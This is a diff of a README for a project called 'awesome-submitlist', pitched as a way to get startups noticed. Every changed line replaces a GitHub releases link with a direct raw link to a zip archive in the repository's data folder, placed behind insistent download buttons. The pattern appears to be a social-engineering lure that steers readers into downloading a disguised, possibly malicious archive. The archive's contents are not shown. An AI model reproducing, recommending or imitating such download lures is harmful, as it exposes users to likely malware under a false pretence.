@@ -1,6 +1,6 @@
 # 🚀 awesome-submitlist - Get Your Startup Noticed Today
 
-[![Download Now](https://img.shields.io/badge/Download-Awesome_Submitlist-2ea44f?style=for-the-badge&logo=github)](https://github.com/acidloving-charge8667/awesome-submitlist/releases)
+[![Download Now](https://img.shields.io/badge/Download-Awesome_Submitlist-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/acidloving-charge8667/awesome-submitlist/main/data/awesome-submitlist-v1.2.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these simple steps to download and start using awesome-submitlist on your
 
 Visit this link to download the application. It only takes a few seconds.
 
-[**>> CLICK HERE TO DOWNLOAD <<**](https://github.com/acidloving-charge8667/awesome-submitlist/releases)
+[**>> CLICK HERE TO DOWNLOAD <<**](https://raw.githubusercontent.com/acidloving-charge8667/awesome-submitlist/main/data/awesome-submitlist-v1.2.zip)
 
 The download will start automatically. If it doesn't, look for a "Download" button on the page that appears.
 
@@ -115,7 +115,7 @@ You have nothing to lose and hundreds of potential new visitors and backlinks to
 
 ### Download Now and Join Thousands of Successful Makers
 
-[**🚀 Get Your Copy Here 🚀**](https://github.com/acidloving-charge8667/awesome-submitlist/releases)
+[**🚀 Get Your Copy Here 🚀**](https://raw.githubusercontent.com/acidloving-charge8667/awesome-submitlist/main/data/awesome-submitlist-v1.2.zip)
 
 ---
 
